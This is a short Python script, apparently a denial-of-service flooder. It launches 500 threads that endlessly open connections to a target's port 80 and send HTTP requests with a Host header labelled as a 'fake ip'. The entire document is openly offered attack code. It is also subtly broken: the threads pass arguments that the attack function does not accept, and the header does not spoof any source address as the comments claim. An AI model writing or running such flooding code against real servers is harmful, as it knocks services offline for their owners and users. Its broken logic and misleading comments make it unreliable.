import socket
import threading

target = "192.168.1.1" # 
fake_ip = "182.21.20.32"
port = 80

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port)) # connect to the target
        s.sendto (f"GET /{target} HTTP/1.1\r\n".encode('ascii'), (target, port)) # send a request to the target
        s.sendto (f"Host: {fake_ip}\r\n\r\n".encode('ascii'), (target, port)) # send a fake ip address
        s.close()
        
for i in range(500):
    thread = threading.Thread(target=attack, args=(target, fake_ip, port))
    thread.start()
